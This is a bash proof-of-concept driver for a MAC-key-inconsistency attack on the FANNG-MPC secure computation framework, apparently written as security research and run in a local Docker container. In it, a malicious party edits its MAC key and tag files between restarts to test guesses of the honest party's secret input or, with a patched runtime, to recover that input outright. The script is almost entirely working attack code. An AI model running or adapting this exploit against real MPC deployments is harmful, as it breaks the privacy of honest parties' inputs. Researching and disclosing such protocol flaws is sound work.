#!/usr/bin/env bash
# Off-key cross-run MAC-key-inconsistency attack on FANNG-MPC Full Threshold.
# FANNG is a SCALE-MAMBA fork; this mirrors ../scale-mamba/run-attack.sh.
#
# One entry point for both circuits and both attack strengths. Both parties run
# the SAME, UNMODIFIED FANNG Player binary; the only adversarial action is Player 1
# editing its own files (Data/MKey-1.key, and for the selective attack its
# Memory-P1 MAC tag) between two runs of the supported -memory old restart path.
#
# Usage:
#   ./run-attack.sh --circuit mult|affine --attack selective|recovery \
#                   --real-y N [--guess-of-y G] [--x X]
#
#   --circuit      mult   f(x, y) = x*y; the attacker fixes x=0 (output always 0).
#                  affine f(x; (y, r)) = x*y + r, r a uniform input of the honest
#                         party (output hides y).
#   --attack       selective  guess y; run 2 completes iff the guess is correct.
#                  recovery   read y outright from the unmasked MAC check (no guess).
#   --real-y  N    the honest party's secret y.
#   --guess-of-y G the attacker's guess of y (required for selective).
#   --x       X    the attacker's input x (affine only; default 1; mult fixes x=0).
#
# FAKE=1 uses the fast, low-memory trusted-dealer offline; the default is the real
# FHE/BGV offline (needs native x86, >= 32 GB RAM; OOMs under emulation).
#
# Prerequisite: a running FANNG container named `fanng` with the repo at /fanng:
#     docker/run.sh build && docker/run.sh up && docker/run.sh progs
# The recovery attacks additionally apply patches/offkey_recover.py to the mounted
# source and REBUILD the runtime once (the selective attacks need no rebuild).
#
# Examples:
#   ./run-attack.sh --circuit mult   --attack selective --guess-of-y 5 --real-y 5
#   ./run-attack.sh --circuit mult   --attack recovery  --real-y 12345
#   ./run-attack.sh --circuit affine --attack selective --guess-of-y 1 --real-y 1
#   ./run-attack.sh --circuit affine --attack recovery  --real-y 12345 --x 3
set -euo pipefail
cd "$(dirname "$0")"

usage() {
  echo "Usage: ./run-attack.sh --circuit mult|affine --attack selective|recovery --real-y N [--guess-of-y G] [--x X]" >&2
}

CIRCUIT=""; ATTACK=""; REAL_Y=""; GUESS_OF_Y=""; X=""
while [ $# -gt 0 ]; do
  case "$1" in
    --circuit)     CIRCUIT="$2"; shift 2;;
    --attack)      ATTACK="$2"; shift 2;;
    --real-y)      REAL_Y="$2"; shift 2;;
    --guess-of-y)  GUESS_OF_Y="$2"; shift 2;;
    --x)           X="$2"; shift 2;;
    -h|--help)     grep '^#' "$0" | cut -c3-; exit 0;;
    *) echo "error: unknown option '$1'" >&2; usage; exit 2;;
  esac
done

case "$CIRCUIT" in mult|affine) ;; *) echo "error: --circuit must be 'mult' or 'affine'" >&2; usage; exit 2;; esac
case "$ATTACK"  in selective|recovery) ;; *) echo "error: --attack must be 'selective' or 'recovery'" >&2; usage; exit 2;; esac
[ -n "$REAL_Y" ] || { echo "error: --real-y is required" >&2; usage; exit 2; }
if [ "$ATTACK" = selective ] && [ -z "$GUESS_OF_Y" ]; then
  echo "error: --guess-of-y is required for --attack selective" >&2; exit 2
fi
if [ "$ATTACK" = recovery ] && [ -n "$GUESS_OF_Y" ]; then
  echo "note: --guess-of-y is ignored for --attack recovery" >&2
fi
if [ "$CIRCUIT" = mult ] && [ -n "$X" ]; then
  echo "note: --x is ignored for --circuit mult (the attacker fixes x=0)" >&2
fi
X=${X:-1}

# Program per (circuit, attack).
if   [ "$CIRCUIT" = mult   ] && [ "$ATTACK" = selective ]; then PROG=attack_open
elif [ "$CIRCUIT" = mult   ] && [ "$ATTACK" = recovery  ]; then PROG=attack_recover
elif [ "$CIRCUIT" = affine ] && [ "$ATTACK" = selective ]; then PROG=attack_affine
else                                                            PROG=attack_affine_recover
fi

CONTAINER=fanng
FAKE="${FAKE:-0}"
# Compiler arch for the recovery runtime rebuild. Default to the native x86 box
# (keeps the real FHE offline fast). Under linux/amd64 emulation, override with a
# portable, no-AVX arch, e.g.
#   ARCH='-maes -mpclmul -msse4.1 -march=core2 -mtune=generic' ./run-attack.sh ...
ARCH="${ARCH:--march=native}"

if ! docker ps --format '{{.Names}}' | grep -qx "$CONTAINER"; then
  echo "error: container '$CONTAINER' is not running."
  echo "Build FANNG first via its docker harness (in the FANNG-MPC repo):"
  echo "    docker/run.sh build && docker/run.sh up && docker/run.sh progs"
  exit 1
fi

echo "=== Off-Key Cross-Run Attack on FANNG-MPC (Full Threshold) ==="
echo "Circuit: $CIRCUIT    Attack: $ATTACK"
echo "Honest party's real y: $REAL_Y"
[ "$ATTACK" = selective ] && echo "Attacker's guess of y: $GUESS_OF_Y"
R=$(python3 -c "import secrets; print(secrets.randbits(64))")
[ "$CIRCUIT" = affine ] && echo "Attacker's input x:    $X   (output x*y+r masked by r = $R, hidden from the attacker)"
[ "$FAKE" = 1 ] && echo "Offline: trusted-dealer (FAKE=1) + -dOT  (fast, low memory)" \
                || echo "Offline: FHE/BGV (real, default) + -dOT  (needs native x86, >= 32 GB RAM; FAKE=1 for fast low-memory run)"
echo

# Recovery needs python3 in-container for the source patcher.
if [ "$ATTACK" = recovery ]; then
  docker exec "$CONTAINER" bash -lc 'command -v python3 >/dev/null 2>&1 || (apt-get update -qq && apt-get install -y -qq python3)' >/dev/null 2>&1 \
    || { echo 'error: could not ensure python3 in the container'; exit 1; }
fi

# Install variant 18, sync the poc scripts and the attack programs for this combo.
docker exec "$CONTAINER" bash -lc "cp Auto-Test-Data/18/* Data/ && cp Auto-Test-Data/Cert-Store/* Cert-Store/ && mkdir -p /fanng/poc /fanng/poc/patches /fanng/Programs/attack_store /fanng/Programs/$PROG" >/dev/null
docker cp poc.sh     "$CONTAINER":/fanng/poc/poc.sh     >/dev/null
docker cp patcher.py "$CONTAINER":/fanng/poc/patcher.py >/dev/null
docker cp Programs/attack_store/attack_store.mpc "$CONTAINER":/fanng/Programs/attack_store/attack_store.mpc >/dev/null
docker cp "Programs/$PROG/$PROG.mpc"             "$CONTAINER":/fanng/Programs/"$PROG"/"$PROG".mpc           >/dev/null

if [ "$ATTACK" = recovery ]; then
  echo "--- Applying recovery instrumentation and rebuilding the runtime (once) ---"
  docker cp patches/offkey_recover.py "$CONTAINER":/fanng/poc/patches/offkey_recover.py >/dev/null
  docker exec "$CONTAINER" bash -lc 'python3 /fanng/poc/patches/offkey_recover.py /fanng/src/LSSS/Open_Protocol.cpp'
  docker exec "$CONTAINER" bash -lc "make -C src ARCH='$ARCH' -j\$(nproc) 2>&1 | tail -2" \
    || { echo 'error: runtime rebuild failed'; exit 1; }
fi
docker exec "$CONTAINER" bash -lc "./compile-new.sh Programs/attack_store >/dev/null 2>&1 && ./compile-new.sh Programs/$PROG >/dev/null 2>&1" \
  || { echo "error: failed to compile the attack programs (is the runtime built? see prerequisites)"; exit 1; }

poc() { docker exec -e FAKE="$FAKE" -e QUIET=1 -e AFF_X="$X" -e AFF_R="$R" "$CONTAINER" bash -lc "bash /fanng/poc/poc.sh $*"; }

echo
echo "--- Run 1: honest party stores its secret y (authenticated under MAC key alpha) ---"
poc store "$REAL_Y"
echo

report_selective() {   # $1 = complete|abort
  echo "=== RESULT ==="
  if [ "$1" = complete ]; then
    echo "Protocol COMPLETED  ->  guess CORRECT  ->  the attacker learns y == $GUESS_OF_Y"
  else
    echo "Protocol ABORTED (mac_fail)  ->  guess WRONG  ->  the attacker learns y != $GUESS_OF_Y"
  fi
}
report_recovery() {   # $1 = recovered value (may be empty)
  echo "=== RESULT ==="
  if [ -n "$1" ]; then
    echo "The attacker recovered the honest party's secret: y = $1"
    [ "$1" = "$REAL_Y" ] && echo "(matches the true secret $REAL_Y, recovered in a single run)" \
                         || echo "(true secret was $REAL_Y; recovered value differs, inspect the logs)"
  else
    echo "No recovery line found; inspect the run output above."
  fi
}

if [ "$ATTACK" = selective ]; then
  echo "--- Run 2: attacker restarts (alpha_1 += 1, adds guess g=$GUESS_OF_Y to y's MAC) ---"
  if [ "$CIRCUIT" = mult ]; then
    if poc open   "guess:$GUESS_OF_Y"; then v=complete; else v=abort; fi
  else
    if poc affine "guess:$GUESS_OF_Y"; then v=complete; else v=abort; fi
  fi
  echo; report_selective "$v"
else
  echo "--- Run 2: attacker restarts (alpha_1 += 1) and inverts the unmasked check ---"
  if [ "$CIRCUIT" = mult ]; then
    out="$(poc recover 0)"
  else
    out="$(poc affine-recover 0)"
  fi
  echo "$out" | sed 's/^/  /'
  REC="$(printf '%s\n' "$out" | sed -n 's/.*RECOVERED_Y=\([0-9-]*\).*/\1/p' | head -1)"
  echo; report_recovery "$REC"
fi

echo
echo "The honest party (P0) ran the unmodified FANNG binary in both runs; only"
echo "P1's own files were edited between them. The opened output reveals nothing"
echo "about y (mult: x*y=0; affine: x*y+r masked by the honest party's r)."
